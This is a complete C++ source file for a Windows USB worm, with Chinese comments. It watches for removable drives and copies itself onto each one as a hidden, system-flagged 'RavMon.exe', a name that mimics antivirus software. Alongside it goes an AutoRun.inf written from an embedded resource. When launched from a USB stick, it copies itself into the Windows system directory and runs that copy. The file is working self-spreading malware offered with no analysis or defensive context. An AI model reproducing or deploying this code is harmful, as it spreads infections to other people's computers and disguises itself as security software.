// Uinfect.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"

void ResourceToFile(char  *filename,char *Name,char* Type)
{
	//寻找自身进程中的资源
    HRSRC hRes = FindResource(NULL,Name,Type);
	if(hRes==NULL)
		return;
	//导入资源
    HGLOBAL hgRes = LoadResource(NULL, hRes);
	if(hgRes==NULL)
		return;
	//锁定资源
    void *pRes = LockResource(hgRes);
	if(pRes==NULL)
		return;
	//得到资源字节数
    DWORD size = SizeofResource(NULL, hRes);
	if(size==0)
		return;
	//创建文件
    HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, 0, 
		             CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
    if(hFile==INVALID_HANDLE_VALUE)
		return;
    DWORD dwWrite;
	//把资源写入到文件
    if(!WriteFile(hFile, pRes, size, &dwWrite, 0))
		return;
	//关闭文件句柄
    CloseHandle(hFile);
	//释放资源
	GlobalFree(hgRes);
}

BOOL InfectU()
{
	while(true)
	{
		UINT revtype;
		char name[256]="H:\\" ;
		char szName[256]={0};
		char toPath[256]={0};
		char infPath[256]={0};
		char openU[80]={0};
		//遍历所有盘符
		for(BYTE i=0x42;i<0x5B;i=i+0x01)
		{
			name[0]=i;
			//得到盘符类型
			revtype=GetDriveType(name);
			//判断是否是可移动存储设备
			if (revtype==DRIVE_REMOVABLE)
			{   
				//得到自身文件路径
				GetModuleFileName(NULL,szName,256);
				//比较是否和U盘的盘符相同
				if(strncmp(name,szName,1)==0)
				{
					//得到系统目录
					GetSystemDirectory(toPath,256);
					strcat(toPath,"\\Uinfect.exe");
					//把自身文件复制到系统目录
					if(CopyFile(szName,toPath,TRUE))
					{
						//运行程序
						WinExec(toPath,0);	
					}
					strcpy(openU,"explorer ");
					strcat(openU,name);
					//打开U盘
					WinExec(openU,1);
					return 0;	
				}
				else
				{
					strcpy(toPath,name);
					strcat(toPath,"\\RavMon.exe");
					strcpy(infPath,name);
					strcat(infPath,"\\AutoRun.inf");
					//还原U盘上的文件属性
					SetFileAttributes(toPath,FILE_ATTRIBUTE_NORMAL);
					SetFileAttributes(infPath,FILE_ATTRIBUTE_NORMAL);
					//删除原有文件
                    DeleteFile(toPath);
					DeleteFile(infPath);
					//释放AutoRun.inf到U盘
					ResourceToFile(infPath,MAKEINTRESOURCE(ID_DAT),
						       MAKEINTRESOURCE(RC_AUTORUN));
					//拷贝自身文件到U盘
					CopyFile(szName,toPath,FALSE);
					//把这两个文件设置成系统，隐藏属性
					SetFileAttributes(toPath,
						FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
					SetFileAttributes(infPath,
						FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
				}
			}
		}
		//休眠60秒，60检测一次
		Sleep(60000);
	}
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 InfectU();
	return 0;
}



